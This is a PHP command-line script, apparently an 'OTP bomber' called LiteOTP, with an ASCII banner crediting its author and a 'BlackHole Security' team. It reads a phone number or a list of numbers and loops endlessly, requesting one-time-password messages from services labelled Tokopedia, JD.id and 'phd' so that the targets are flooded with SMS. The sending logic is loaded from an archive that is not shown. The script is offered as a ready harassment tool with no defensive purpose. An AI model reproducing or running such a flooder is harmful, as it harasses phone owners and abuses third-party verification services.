<?php

/*
 * This is free and unencumbered software released into the public domain.
 *
 * Anyone is free to copy, modify, publish, use, compile, sell, or
 * distribute this software, either in source code form or as a compiled
 * binary, for any purpose, commercial or non-commercial, and by any
 * means.
 *
 * In jurisdictions that recognize copyright laws, the author or authors
 * of this software dedicate any and all copyright interest in the
 * software to the public domain. We make this dedication for the benefit
 * of the public at large and to the detriment of our heirs and
 * successors. We intend this dedication to be an overt act of
 * relinquishment in perpetuity of all present and future rights to this
 * software under copyright law.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
 * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
 * OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
 * ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
 * OTHER DEALINGS IN THE SOFTWARE.
 *
 * For more information, please refer to <http://unlicense.org/>
 */

require_once 'phar://main.phar/class.php';
if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
    $R  = '';
    $RR = '';
    $G  = '';
    $GG = '';
    $B  = '';
    $BB = '';
    $Y  = '';
    $YY = '';
    $X  = '';
} else {
    $R  = "\e[91m";
    $RR = "\e[91;7m";
    $G  = "\e[92m";
    $GG = "\e[92;7m";
    $B  = "\e[36m";
    $BB = "\e[36;7m";
    $Y  = "\e[93m";
    $YY = "\e[93;7m";
    $X  = "\e[0m\n";
}

echo $Y.
    '
 _     _ _        ___ _____ ____
| |   (_) |_ ___ / _ \_   _|  _ \
| |   | | __/ _ \ | | || | | |_) |
| |___| | ||  __/ |_| || | |  __/
|_____|_|\__\___|\___/ |_| |_|';
echo $R."\n".'++++++++++++++++++++++++++++++++++++++';
echo $B."\n".'Author  : Cvar1984                   '.$R.'+';
echo $B."\n".'Github  : https://github.com/Cvar1984'.$R.'+';
echo $B."\n".'Team    : BlackHole Security         '.$R.'+';
echo $B."\n".'Version : 2.5                        '.$R.'+';
echo $B."\n".'Date    : 13-03-2018                 '.$R.'+';
echo $R."\n".'++++++++++++++++++++++++++++++++++++++'.$G.$X."\n";
if(!isset($argv[1])) {
    fprintf(STDERR,$RR.'[!] Input No List [!]'.$X);
    exit(1);
}
try {
    $bom=new Otp();
    $argv[1]=trim($argv[1]);
    if(is_numeric($argv[1])) {
        $bom->sendOtp($argv[1],'tokopedia');
        while(1) {
            fprintf(STDOUT,$G.'Send OTP to '.$Y.'['.$argv[1].']'.$X);
            $bom->sendOtp($argv[1],'jdid');
            $bom->sendOtp($argv[1],'phd');
        }
    }
    else if(file_exists($argv[1])) {
        $argv[1]=explode("\n",file_get_contents($argv[1]));
        $count=sizeof($argv[1]);
        while(1) {
            for($x=0;$x<$count;$x++) {
                fprintf(STDOUT,$G.'Send OTP to '.$Y.'['.$argv[1][$x].']'.$X);
                $bom->sendOtp($argv[1][$x],'tokopedia');
                $bom->sendOtp($argv[1][$x],'jdid');
                $bom->sendOtp($argv[1][$x],'phd');
            }
        }
    }
    else {
        fprintf(STDERR,$RR.'File not exist'.$argv[1].$X);
        exit(1);
    }
} catch(Exception $e) {
    echo $e->xdebug_message;
}
